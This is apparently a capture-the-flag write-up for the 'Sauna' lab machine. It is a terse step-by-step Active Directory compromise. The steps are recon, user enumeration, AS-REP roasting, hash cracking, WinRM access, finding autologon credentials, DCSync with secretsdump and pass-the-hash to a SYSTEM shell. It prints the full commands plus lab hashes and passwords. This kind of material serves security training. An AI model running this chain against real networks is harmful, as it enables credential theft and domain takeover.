# Recon
```
─$ nmap -sC -sV 10.10.10.175 -Pn
Starting Nmap 7.93 ( https://nmap.org ) at 2023-08-07 04:22 EEST
Stats: 0:00:47 elapsed; 0 hosts completed (1 up), 1 undergoing Service Scan
Service scan Timing: About 50.00% done; ETC: 04:23 (0:00:07 remaining)
Nmap scan report for 10.10.10.175
Host is up (0.14s latency).
Not shown: 994 filtered tcp ports (no-response)
PORT     STATE SERVICE      VERSION
88/tcp   open  kerberos-sec Microsoft Windows Kerberos (server time: 2023-08-07 07:23:44Z)
464/tcp  open  kpasswd5?
593/tcp  open  ncacn_http   Microsoft Windows RPC over HTTP 1.0
636/tcp  open  tcpwrapped
3268/tcp open  ldap         Microsoft Windows Active Directory LDAP (Domain: EGOTISTICAL-BANK.LOCAL0., Site: Default-First-Site-Name)
3269/tcp open  tcpwrapped
Service Info: Host: SAUNA; OS: Windows; CPE: cpe:/o:microsoft:windows

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 65.57 seconds
```
- run kerbrute
```
./TOOLS/kerbrute userenum --dc EGOTISTICAL-BANK.LOCAL -d EGOTISTICAL-BANK.LOCAL /home/kali/TOOLS/Active-Directory-Wordlists/User.txt
```
- found username Administrator
- we found users on about.html we need to build users
```
./username-anarchy --input-file /home/kali/usersw.txt --select-format first,flast,first.last,firstl > unames.txt
```
- we build usernames to form windows users
- Using Impacket's GetNPUser, we can attempt an ASREPRoasting attack in order to extract a hash from user accounts that do not require pre-authentication
- we run bash command to rotate users
```
while read p; do impacket-GetNPUsers egotistical-bank.local/"$p" -request -no-pass -dc-ip 10.10.10.175 >> hash.txt; done < unames.txt
```
- we got hash from fsmith
```
─$ cat hash.txt  
Impacket v0.10.0 - Copyright 2022 SecureAuth Corporation

[*] Getting TGT for fergus
[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)
Impacket v0.10.0 - Copyright 2022 SecureAuth Corporation

[*] Getting TGT for fergus.smith
[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)
Impacket v0.10.0 - Copyright 2022 SecureAuth Corporation

[*] Getting TGT for ferguss
[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)
Impacket v0.10.0 - Copyright 2022 SecureAuth Corporation

[*] Getting TGT for fsmith
$krb5asrep$23$fsmith@EGOTISTICAL-BANK.LOCAL:6f3f159dcc3734adc43d59f162aafb9f$b03a3c00cb4bd363393ffa2d2d4a2d27255637835ea76cc70524ec4f8bb69dbec46fb621be4a5596a0e9933950a5120f8f71f7f3887c85d4cc25a68340df5788c879af8a0bf8b310425e47999a4e00328ed8b9d0f4baf8405c5334a2e0afe61e648d5c26319767f1c5e4a3ac7327dfce5bb77df709f36c2bf808f439f0219904d7013542346abb0c3e0bf5b0bf133b2ad6ba01c817522bbcdf54d28f3539a9006061c7de9721044cf857aeef29ac5c33d511941c204c2522967f72037cef37e13b2c07ed8793cc7432e6acdfeff0e21428c52230e7c1b98bd2ad08efac45d2720ba15e7399a028faa20e26d8fca78750fd5cf3848a339a8252aff34f4bd717ae
Impacket v0.10.0 - Copyright 2022 SecureAuth Corporation

```
- now crack the hash with hashcat
```
hashcat -m 18200 -a 0 hashas.txt /usr/share/wordlists/rockyou.txt
```
- we got pass Thestrokes23
- we got creds and 5985 port is open we now use evilwinrm
```
evil-winrm -i 10.10.10.175 -u fsmith -p Thestrokes23
```
- and we got ashell
# Priv Esc
- use a script such as WinPEAS to automate enumeration tasks. Use the upload command from our current WinRM session to transfer the binary to the remote server, and then run it
- The script reveals that the user EGOTISTICALBANK\svc_loanmanager has been set to automatically log in, and this account has the password Moneymakestheworldgoround!
- command net user svc_loanmgr reveals that this user is also part of the Remote Management Users group
- now we use bloodhound
```
bloodhound-python -u svc_loanmgr -p Moneymakestheworldgoround! -d EGOTISTICALBANK.LOCAL -ns 10.10.10.175 -c All
```
- we see from bloodhound that svcloanmgr cabaple of DCSync
# DCSync
- Impacket's secretsdump.py can be used to perform this attack
```
impacket-secretsdump egotistical-bank/svc_loanmgr:'Moneymakestheworldgoround!'@10.10.10.175 -just-dc-user Administrator
```
- extracted the hash of the administrator
- now perform pass the hash using psexec
```
$ impacket-psexec egotistical-bank.local/administrator@10.10.10.175 -hashes aad3b435b51404eeaad3b435b51404ee:823452073d75b9d1cf70ebdf86c7f98e
```
- now we got a a shell as system
